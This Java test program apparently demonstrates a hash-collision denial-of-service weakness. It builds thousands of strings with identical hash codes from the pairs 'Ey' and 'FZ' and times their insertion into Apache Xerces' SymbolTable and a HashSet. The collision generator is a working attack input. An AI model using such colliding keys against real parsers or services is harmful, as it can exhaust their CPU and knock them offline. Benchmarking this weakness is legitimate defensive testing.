import org.apache.xerces.util.SymbolTable;
import java.util.*;
import java.io.*;

public class HashDoSTest
{
// --------------------------------------------------------------------------------
public static void getCollision( ArrayList list, Map m, int len, String s, final String type )
throws Exception
{
String[] array = new String[]{ "Ey", "FZ" };
for (int i = 0; i < 2; ++i )
	{
	if ( s.length() < len )
		{
		getCollision( list, m, len, s + array[ i ], type );
		}
	else
		{
		String key = s + array[ i ];
		list.add( key );
		}
	}
}
//--------------------------------------------------------------------------------
public static void main( String[] args )
throws Exception
{
SymbolTable t = new SymbolTable();

ArrayList list = new ArrayList();
getCollision( list, null, 27, "", "Java" );

p( "size:" + list.size() );

p( "=========\nTesting SymbolTable..." );
long start = System.currentTimeMillis();
long start2 = start;
for( int i = 0; i < list.size(); ++i )
	{
	if( i % 1000 == 0 )
		{
		p( ( System.currentTimeMillis() - start2 ) + " ms" );
		start2 = System.currentTimeMillis();
		}
	t.addSymbol( list.get( i ) + "" );
	}
p( "TOTAL: " + ( System.currentTimeMillis() - start ) + " ms" );

p( "=========\nTesting HashSet..." );
start = System.currentTimeMillis();
start2 = start;
Set s = new HashSet();
for( int i = 0; i < list.size(); ++i )
	{
	if( i % 1000 == 0 )
		{
		p( ( System.currentTimeMillis() - start2 ) + " ms" );
		start2 = System.currentTimeMillis();
		}
	s.add( list.get( i ) + "" );
	}
p( "TOTAL: " + ( System.currentTimeMillis() - start ) + " ms" );
}
//--------------------------------------------------------------------------------
public static void p( Object o )
{
System.out.println( o );
}
//--------------------------------------------------------------------------------
}
